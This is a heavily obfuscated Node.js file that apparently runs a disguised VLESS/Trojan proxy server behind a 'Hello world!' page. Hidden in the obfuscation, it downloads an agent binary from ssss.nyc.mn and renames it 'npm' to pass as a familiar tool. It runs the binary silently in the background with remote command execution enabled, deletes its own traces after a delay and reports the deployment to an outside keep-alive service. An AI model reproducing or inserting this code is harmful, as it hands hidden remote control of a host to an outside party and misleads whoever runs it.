const _0x32afdc=_0x63dd;(function(_0x450bd3,_0x40ed9a){const _0x4be763=_0x63dd,_0x492bd8=_0x450bd3();while(!![]){try{const _0x2a8945=parseInt(_0x4be763(0x15d))/0x1*(parseInt(_0x4be763(0x149))/0x2)+parseInt(_0x4be763(0x14b))/0x3+parseInt(_0x4be763(0x152))/0x4*(parseInt(_0x4be763(0x136))/0x5)+parseInt(_0x4be763(0x138))/0x6+-parseInt(_0x4be763(0x165))/0x7+-parseInt(_0x4be763(0x125))/0x8+parseInt(_0x4be763(0x11d))/0x9;if(_0x2a8945===_0x40ed9a)break;else _0x492bd8['push'](_0x492bd8['shift']());}catch(_0x59e387){_0x492bd8['push'](_0x492bd8['shift']());}}}(_0x3be6,0x94274));const os=require('os'),http=require(_0x32afdc(0x10f)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x32afdc(0x118)),crypto=require('crypto'),{Buffer}=require(_0x32afdc(0x119)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x32afdc(0x132)]['UUID']||_0x32afdc(0x11f),NEZHA_SERVER=process[_0x32afdc(0x132)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x32afdc(0x132)][_0x32afdc(0x106)]||'',NEZHA_KEY=process[_0x32afdc(0x132)][_0x32afdc(0x145)]||'',DOMAIN=process[_0x32afdc(0x132)]['DOMAIN']||_0x32afdc(0x13d),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x32afdc(0x132)][_0x32afdc(0x144)]||UUID[_0x32afdc(0x14c)](0x0,0x8),SUB_PATH=process[_0x32afdc(0x132)][_0x32afdc(0x10c)]||_0x32afdc(0x16f),NAME=process[_0x32afdc(0x132)]['NAME']||'',PORT=process[_0x32afdc(0x132)][_0x32afdc(0x15a)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x45f739=_0x32afdc;try{const _0x479cf3=await axios[_0x45f739(0x113)]('https://api.ip.sb/geoip'),_0x101aa6=_0x479cf3[_0x45f739(0x12c)];ISP=(_0x101aa6[_0x45f739(0x16a)]+'-'+_0x101aa6[_0x45f739(0xfd)])[_0x45f739(0x16d)](/ /g,'_');}catch(_0x31c1fb){ISP=_0x45f739(0x157);}};GetISP();function _0x63dd(_0x1bf367,_0x125e10){_0x1bf367=_0x1bf367-0xf4;const _0x3be65a=_0x3be6();let _0x63dd50=_0x3be65a[_0x1bf367];return _0x63dd50;}const httpServer=http[_0x32afdc(0x12e)]((_0x4a1f27,_0x180546)=>{const _0x465177=_0x32afdc;if(_0x4a1f27[_0x465177(0x111)]==='/'){const _0x53d7e8=path[_0x465177(0x150)](__dirname,'index.html');fs['readFile'](_0x53d7e8,_0x465177(0x143),(_0x342cb3,_0x5464af)=>{const _0x5c0f78=_0x465177;if(_0x342cb3){_0x180546['writeHead'](0xc8,{'Content-Type':_0x5c0f78(0x11c)}),_0x180546[_0x5c0f78(0x10d)](_0x5c0f78(0x12d));return;}_0x180546[_0x5c0f78(0xfe)](0xc8,{'Content-Type':_0x5c0f78(0x11c)}),_0x180546[_0x5c0f78(0x10d)](_0x5464af);});return;}else{if(_0x4a1f27[_0x465177(0x111)]==='/'+SUB_PATH){const _0x21b591=NAME?NAME+'-'+ISP:ISP,_0x1df32f=_0x465177(0x121)+UUID+'@'+DOMAIN+_0x465177(0xf6)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x465177(0x124)+WSPATH+'#'+_0x21b591,_0x3ad5e7=_0x465177(0x15f)+UUID+'@'+DOMAIN+_0x465177(0x13b)+DOMAIN+_0x465177(0x166)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x21b591,_0x2976e9=_0x1df32f+'\x0a'+_0x3ad5e7,_0x2dc8dd=Buffer[_0x465177(0x120)](_0x2976e9)[_0x465177(0x15b)](_0x465177(0x137));_0x180546['writeHead'](0xc8,{'Content-Type':_0x465177(0x128)}),_0x180546[_0x465177(0x10d)](_0x2dc8dd+'\x0a');}else _0x180546[_0x465177(0xfe)](0x194,{'Content-Type':'text/plain'}),_0x180546[_0x465177(0x10d)](_0x465177(0x135));}}),wss=new WebSocket[(_0x32afdc(0x155))]({'server':httpServer}),uuid=UUID[_0x32afdc(0x16d)](/-/g,''),DNS_SERVERS=[_0x32afdc(0x13c),_0x32afdc(0x10b)];function resolveHost(_0x25e6f6){return new Promise((_0x838bee,_0x585adf)=>{const _0x13604f=_0x63dd;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x13604f(0x156)](_0x25e6f6)){_0x838bee(_0x25e6f6);return;}let _0x347f01=0x0;function _0x3b20a2(){const _0x2cf0a5=_0x13604f;if(_0x347f01>=DNS_SERVERS[_0x2cf0a5(0x116)]){_0x585adf(new Error(_0x2cf0a5(0x16e)+_0x25e6f6+_0x2cf0a5(0x129)));return;}const _0xf85f2a=DNS_SERVERS[_0x347f01];_0x347f01++;const _0x2f9507=_0x2cf0a5(0x126)+encodeURIComponent(_0x25e6f6)+_0x2cf0a5(0xfa);axios[_0x2cf0a5(0x113)](_0x2f9507,{'timeout':0x1388,'headers':{'Accept':_0x2cf0a5(0x141)}})[_0x2cf0a5(0x163)](_0x129b0c=>{const _0x1139df=_0x2cf0a5,_0x4f4325=_0x129b0c[_0x1139df(0x12c)];if(_0x4f4325[_0x1139df(0x101)]===0x0&&_0x4f4325[_0x1139df(0x16b)]&&_0x4f4325[_0x1139df(0x16b)]['length']>0x0){const _0x2fe864=_0x4f4325[_0x1139df(0x16b)][_0x1139df(0xf4)](_0x23bd10=>_0x23bd10[_0x1139df(0x168)]===0x1);if(_0x2fe864){_0x838bee(_0x2fe864[_0x1139df(0x12c)]);return;}}_0x3b20a2();})[_0x2cf0a5(0x123)](_0x566c84=>{_0x3b20a2();});}_0x3b20a2();});}function handleVlessConnection(_0x3166eb,_0x29ffcb){const _0x435bb8=_0x32afdc,[_0x4b444e]=_0x29ffcb,_0x364e46=_0x29ffcb['slice'](0x1,0x11);if(!_0x364e46['every']((_0xabc29f,_0x6f32c4)=>_0xabc29f==parseInt(uuid[_0x435bb8(0x14a)](_0x6f32c4*0x2,0x2),0x10)))return![];let _0x50275c=_0x29ffcb[_0x435bb8(0x14c)](0x11,0x12)[_0x435bb8(0x12f)]()+0x13;const _0x4a168e=_0x29ffcb['slice'](_0x50275c,_0x50275c+=0x2)[_0x435bb8(0x131)](0x0),_0x1ddb9c=_0x29ffcb['slice'](_0x50275c,_0x50275c+=0x1)[_0x435bb8(0x12f)](),_0xc2e134=_0x1ddb9c==0x1?_0x29ffcb[_0x435bb8(0x14c)](_0x50275c,_0x50275c+=0x4)[_0x435bb8(0x150)]('.'):_0x1ddb9c==0x2?new TextDecoder()[_0x435bb8(0x11e)](_0x29ffcb[_0x435bb8(0x14c)](_0x50275c+0x1,_0x50275c+=0x1+_0x29ffcb[_0x435bb8(0x14c)](_0x50275c,_0x50275c+0x1)[_0x435bb8(0x12f)]())):_0x1ddb9c==0x3?_0x29ffcb[_0x435bb8(0x14c)](_0x50275c,_0x50275c+=0x10)[_0x435bb8(0x147)]((_0x407b24,_0x360cf7,_0x1bb47b,_0x499676)=>_0x1bb47b%0x2?_0x407b24['concat'](_0x499676[_0x435bb8(0x14c)](_0x1bb47b-0x1,_0x1bb47b+0x1)):_0x407b24,[])[_0x435bb8(0x13f)](_0x5e0b5d=>_0x5e0b5d[_0x435bb8(0x131)](0x0)[_0x435bb8(0x15b)](0x10))[_0x435bb8(0x150)](':'):'';_0x3166eb[_0x435bb8(0x142)](new Uint8Array([_0x4b444e,0x0]));const _0x59c5b5=createWebSocketStream(_0x3166eb);return resolveHost(_0xc2e134)['then'](_0xfb0a34=>{const _0x6c9fb3=_0x435bb8;net[_0x6c9fb3(0x108)]({'host':_0xfb0a34,'port':_0x4a168e},function(){const _0x42786d=_0x6c9fb3;this['write'](_0x29ffcb[_0x42786d(0x14c)](_0x50275c)),_0x59c5b5['on'](_0x42786d(0x109),()=>{})['pipe'](this)['on'](_0x42786d(0x109),()=>{})['pipe'](_0x59c5b5);})['on'](_0x6c9fb3(0x109),()=>{});})[_0x435bb8(0x123)](_0x432f76=>{const _0x408a87=_0x435bb8;net[_0x408a87(0x108)]({'host':_0xc2e134,'port':_0x4a168e},function(){const _0x1f6345=_0x408a87;this[_0x1f6345(0x14f)](_0x29ffcb[_0x1f6345(0x14c)](_0x50275c)),_0x59c5b5['on']('error',()=>{})[_0x1f6345(0x130)](this)['on'](_0x1f6345(0x109),()=>{})[_0x1f6345(0x130)](_0x59c5b5);})['on'](_0x408a87(0x109),()=>{});}),!![];}function handleTrojanConnection(_0xfe0e4c,_0x2bdb38){const _0x52be38=_0x32afdc;try{if(_0x2bdb38[_0x52be38(0x116)]<0x3a)return![];const _0x114036=_0x2bdb38['slice'](0x0,0x38)[_0x52be38(0x15b)](),_0x1b0fa6=[UUID];let _0x290a4d=null;for(const _0x1722b4 of _0x1b0fa6){const _0xc8b0ba=crypto[_0x52be38(0x127)]('sha224')[_0x52be38(0xf5)](_0x1722b4)[_0x52be38(0x134)](_0x52be38(0x10e));if(_0xc8b0ba===_0x114036){_0x290a4d=_0x1722b4;break;}}if(!_0x290a4d)return![];let _0x34b531=0x38;_0x2bdb38[_0x34b531]===0xd&&_0x2bdb38[_0x34b531+0x1]===0xa&&(_0x34b531+=0x2);const _0x38567a=_0x2bdb38[_0x34b531];if(_0x38567a!==0x1)return![];_0x34b531+=0x1;const _0x5e9747=_0x2bdb38[_0x34b531];_0x34b531+=0x1;let _0x1218ba,_0x217c4b;if(_0x5e9747===0x1)_0x1218ba=_0x2bdb38[_0x52be38(0x14c)](_0x34b531,_0x34b531+0x4)['join']('.'),_0x34b531+=0x4;else{if(_0x5e9747===0x3){const _0x5a7725=_0x2bdb38[_0x34b531];_0x34b531+=0x1,_0x1218ba=_0x2bdb38[_0x52be38(0x14c)](_0x34b531,_0x34b531+_0x5a7725)[_0x52be38(0x15b)](),_0x34b531+=_0x5a7725;}else{if(_0x5e9747===0x4)_0x1218ba=_0x2bdb38[_0x52be38(0x14c)](_0x34b531,_0x34b531+0x10)[_0x52be38(0x147)]((_0x540c93,_0x69d39c,_0x29957d,_0x5827f0)=>_0x29957d%0x2?_0x540c93[_0x52be38(0x13e)](_0x5827f0[_0x52be38(0x14c)](_0x29957d-0x1,_0x29957d+0x1)):_0x540c93,[])[_0x52be38(0x13f)](_0x70df2=>_0x70df2[_0x52be38(0x131)](0x0)[_0x52be38(0x15b)](0x10))[_0x52be38(0x150)](':'),_0x34b531+=0x10;else return![];}}_0x217c4b=_0x2bdb38['readUInt16BE'](_0x34b531),_0x34b531+=0x2;_0x34b531<_0x2bdb38[_0x52be38(0x116)]&&_0x2bdb38[_0x34b531]===0xd&&_0x2bdb38[_0x34b531+0x1]===0xa&&(_0x34b531+=0x2);const _0x20b237=createWebSocketStream(_0xfe0e4c);return resolveHost(_0x1218ba)[_0x52be38(0x163)](_0x3f5794=>{const _0x532765=_0x52be38;net[_0x532765(0x108)]({'host':_0x3f5794,'port':_0x217c4b},function(){const _0x259e86=_0x532765;_0x34b531<_0x2bdb38['length']&&this['write'](_0x2bdb38[_0x259e86(0x14c)](_0x34b531)),_0x20b237['on'](_0x259e86(0x109),()=>{})[_0x259e86(0x130)](this)['on'](_0x259e86(0x109),()=>{})[_0x259e86(0x130)](_0x20b237);})['on'](_0x532765(0x109),()=>{});})['catch'](_0x3200d6=>{const _0x58c786=_0x52be38;net[_0x58c786(0x108)]({'host':_0x1218ba,'port':_0x217c4b},function(){const _0x20b0dd=_0x58c786;_0x34b531<_0x2bdb38['length']&&this[_0x20b0dd(0x14f)](_0x2bdb38['slice'](_0x34b531)),_0x20b237['on'](_0x20b0dd(0x109),()=>{})['pipe'](this)['on'](_0x20b0dd(0x109),()=>{})[_0x20b0dd(0x130)](_0x20b237);})['on'](_0x58c786(0x109),()=>{});}),!![];}catch(_0x4968d4){return![];}}wss['on']('connection',(_0x20632f,_0x1806f7)=>{const _0x515cbf=_0x32afdc,_0x2b02f1=_0x1806f7['url']||'';_0x20632f[_0x515cbf(0x14e)]('message',_0x224bf7=>{const _0x1f6e01=_0x515cbf;if(_0x224bf7[_0x1f6e01(0x116)]>0x11&&_0x224bf7[0x0]===0x0){const _0x1a62cb=_0x224bf7['slice'](0x1,0x11),_0x476f47=_0x1a62cb['every']((_0x2251b4,_0x50c4e9)=>_0x2251b4==parseInt(uuid[_0x1f6e01(0x14a)](_0x50c4e9*0x2,0x2),0x10));if(_0x476f47){!handleVlessConnection(_0x20632f,_0x224bf7)&&_0x20632f[_0x1f6e01(0x107)]();return;}}!handleTrojanConnection(_0x20632f,_0x224bf7)&&_0x20632f[_0x1f6e01(0x107)]();})['on'](_0x515cbf(0x109),()=>{});});const getDownloadUrl=()=>{const _0x432b44=_0x32afdc,_0xdddb6e=os[_0x432b44(0x117)]();return _0xdddb6e===_0x432b44(0x169)||_0xdddb6e===_0x432b44(0x146)||_0xdddb6e===_0x432b44(0xfb)?!NEZHA_PORT?_0x432b44(0x102):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x432b44(0xff):_0x432b44(0x151);},downloadFile=async()=>{const _0x46f1ce=_0x32afdc;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5d4832=getDownloadUrl(),_0x18e392=await axios({'method':_0x46f1ce(0x113),'url':_0x5d4832,'responseType':_0x46f1ce(0x133)}),_0x143882=fs['createWriteStream']('npm');return _0x18e392[_0x46f1ce(0x12c)][_0x46f1ce(0x130)](_0x143882),new Promise((_0x1e9654,_0x2ca068)=>{_0x143882['on']('finish',()=>{const _0xc9827e=_0x63dd;console[_0xc9827e(0x158)](_0xc9827e(0x13a)),exec(_0xc9827e(0x10a),_0x16e547=>{if(_0x16e547)_0x2ca068(_0x16e547);_0x1e9654();});}),_0x143882['on']('error',_0x2ca068);});}catch(_0x4aac57){throw _0x4aac57;}},runnz=async()=>{const _0x3f6d44=_0x32afdc;try{const _0x3e07a7=execSync(_0x3f6d44(0x164),{'encoding':_0x3f6d44(0x148)});if(_0x3e07a7[_0x3f6d44(0x154)]()!==''){console[_0x3f6d44(0x158)](_0x3f6d44(0x153));return;}}catch(_0xfe3909){}await downloadFile();let _0x3fab98='',_0x386419=[_0x3f6d44(0x159),'8443',_0x3f6d44(0x11b),_0x3f6d44(0xf9),_0x3f6d44(0x12a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1f1df1=_0x386419[_0x3f6d44(0x161)](NEZHA_PORT)?_0x3f6d44(0xfc):'';_0x3fab98=_0x3f6d44(0x140)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1f1df1+_0x3f6d44(0x162);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x383520=NEZHA_SERVER[_0x3f6d44(0x161)](':')?NEZHA_SERVER[_0x3f6d44(0x122)](':')[_0x3f6d44(0x110)]():'',_0x56c718=_0x386419['includes'](_0x383520)?_0x3f6d44(0xf7):_0x3f6d44(0x104),_0x5343ff=_0x3f6d44(0x14d)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3f6d44(0x15c)+_0x56c718+_0x3f6d44(0x15e)+UUID;fs[_0x3f6d44(0x139)]('config.yaml',_0x5343ff);}_0x3fab98=_0x3f6d44(0x100);}else{console[_0x3f6d44(0x158)](_0x3f6d44(0x112));return;}}try{exec(_0x3fab98,{'shell':_0x3f6d44(0x115)},_0x365eb2=>{const _0x4f466f=_0x3f6d44;if(_0x365eb2)console['error']('npm\x20running\x20error:',_0x365eb2);else console[_0x4f466f(0x158)](_0x4f466f(0xf8));});}catch(_0x4c2b2c){console['error'](_0x3f6d44(0x167)+_0x4c2b2c);}};async function addAccessTask(){const _0x3dbf4f=_0x32afdc;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x513319=_0x3dbf4f(0x103)+DOMAIN;try{const _0x5996fd=await axios[_0x3dbf4f(0x114)]('https://oooo.serv00.net/add-url',{'url':_0x513319},{'headers':{'Content-Type':_0x3dbf4f(0x160)}});console[_0x3dbf4f(0x158)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x145ffb){}}const delFiles=()=>{const _0x1783fa=_0x32afdc;fs[_0x1783fa(0x16c)](_0x1783fa(0x12b),()=>{}),fs['unlink'](_0x1783fa(0x105),()=>{});};httpServer[_0x32afdc(0x11a)](PORT,()=>{const _0x47fcf1=_0x32afdc;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x47fcf1(0x158)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});function _0x3be6(){const _0xd3846f=['1107621KKKUoJ','slice','client_secret:\x20','once','write','join','https://amd64.ssss.nyc.mn/agent','879596ODLpNx','npm\x20is\x20already\x20running,\x20skip\x20running...','trim','Server','test','Unknown','log','443','PORT','toString','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','503vzrczc','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','trojan://','application/json','includes','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','then','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','6309737TXpeWi','&fp=chrome&type=ws&host=','error:\x20','type','arm','country_code','Answer','unlink','replace','Failed\x20to\x20resolve\x20','sub','find','update',':443?encryption=none&security=tls&sni=','true','npm\x20is\x20running','2087','&type=A','aarch64','--tls','isp','writeHead','https://amd64.ssss.nyc.mn/v1','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Status','https://arm64.ssss.nyc.mn/v1','https://','false','config.yaml','NEZHA_PORT','close','connect','error','chmod\x20+x\x20npm','1.1.1.1','SUB_PATH','end','hex','http','pop','url','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','get','post','/bin/bash','length','arch','path','buffer','listen','2096','text/html','829836PnAINC','decode','b0d92793-0e06-4e64-93d7-98dfa2c9818e','from','vless://','split','catch','&path=%2F','7065536XTEost','https://dns.google/resolve?name=','createHash','text/plain','\x20with\x20all\x20DNS\x20servers','2083','npm','data','Hello\x20world!','createServer','readUInt8','pipe','readUInt16BE','env','stream','digest','Not\x20Found\x0a','10ueRAfx','base64','2660802YElmjD','writeFileSync','npm\x20download\x20successfully',':443?security=tls&sni=','8.8.4.4','1234.abc.com','concat','map','setsid\x20nohup\x20./npm\x20-s\x20','application/dns-json','send','utf8','WSPATH','NEZHA_KEY','arm64','reduce','utf-8','4162VCdLFm','substr'];_0x3be6=function(){return _0xd3846f;};return _0x3be6();}
